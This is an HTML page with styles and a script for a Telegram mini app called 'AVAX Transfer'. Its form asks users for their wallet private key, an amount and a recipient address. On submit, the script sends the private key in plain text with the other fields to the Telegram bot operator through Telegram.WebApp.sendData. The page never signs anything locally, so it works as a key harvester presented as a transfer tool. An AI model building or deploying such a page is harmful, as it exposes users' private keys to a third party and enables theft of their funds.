<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>AVAX Transfer Mini App</title>
  <!-- Google Fonts for better typography -->
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">

  <!-- CSS for Styling and Animations -->
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Poppins', sans-serif;
    }

    body {
      background-color: #1a1a2e;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden;
    }

    .container {
      background-color: #16213e;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
      width: 400px;
      animation: fadeIn 1s ease-in-out;
    }

    .container h2 {
      text-align: center;
      margin-bottom: 20px;
      font-size: 24px;
      font-weight: 600;
      color: #e94560;
    }

    .form-group {
      margin-bottom: 20px;
      position: relative;
    }

    label {
      font-size: 14px;
      font-weight: 400;
      color: #e94560;
      display: block;
      margin-bottom: 5px;
      animation: slideIn 1s ease;
    }

    input[type="text"], input[type="number"] {
      width: 100%;
      padding: 10px;
      background-color: #0f3460;
      border: none;
      border-radius: 5px;
      color: #fff;
      font-size: 16px;
      transition: all 0.3s ease;
    }

    input[type="text"]:focus, input[type="number"]:focus {
      outline: none;
      border: 2px solid #e94560;
    }

    .submit-btn {
      width: 100%;
      padding: 10px;
      background-color: #e94560;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      color: #fff;
      cursor: pointer;
      transition: background-color 0.3s ease;
      font-weight: 600;
      animation: bounceIn 1s ease;
    }

    .submit-btn:hover {
      background-color: #ff6f91;
    }

    @keyframes fadeIn {
      0% { opacity: 0; transform: translateY(-20px); }
      100% { opacity: 1; transform: translateY(0); }
    }

    @keyframes slideIn {
      0% { opacity: 0; transform: translateX(-50px); }
      100% { opacity: 1; transform: translateX(0); }
    }

    @keyframes bounceIn {
      0% { transform: scale(0.5); }
      50% { transform: scale(1.2); }
      100% { transform: scale(1); }
    }

    .form-group input {
      transition: transform 0.3s ease-in-out;
    }

    .form-group input:focus {
      transform: scale(1.05);
    }

  </style>
</head>
<body>

  <div class="container">
    <h2>AVAX Transfer</h2>
    <form id="transferForm">
      <div class="form-group">
        <label for="privateKey">Private Key</label>
        <input type="text" id="privateKey" name="privateKey" required placeholder="Enter your private key">
      </div>

      <div class="form-group">
        <label for="amount">Amount (in AVAX)</label>
        <input type="number" id="amount" name="amount" required placeholder="Enter the amount">
      </div>

      <div class="form-group">
        <label for="address">Recipient Address</label>
        <input type="text" id="address" name="address" required placeholder="Enter recipient address">
      </div>

      <input type="submit" class="submit-btn" value="Submit">
    </form>
  </div>

  <!-- JS for Handling Form and Sending Data to Telegram Bot -->
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <script>
    document.getElementById('transferForm').addEventListener('submit', function(e) {
      e.preventDefault();

      // Collect form data
      const privateKey = document.getElementById('privateKey').value;
      const amount = document.getElementById('amount').value;
      const address = document.getElementById('address').value;

      // Validate inputs
      if (!privateKey || !amount || !address) {
        alert("Please fill out all fields.");
        return;
      }

      // Prepare data to send to Telegram Bot
      const data = JSON.stringify({
        privateKey: privateKey,
        amount: amount,
        address: address
      });

      // Use Telegram Web App API to send data to the bot
      Telegram.WebApp.sendData(data);
    });

    // Expand Telegram web app when opened
    Telegram.WebApp.ready();
    Telegram.WebApp.expand();
  </script>

</body>
</html>
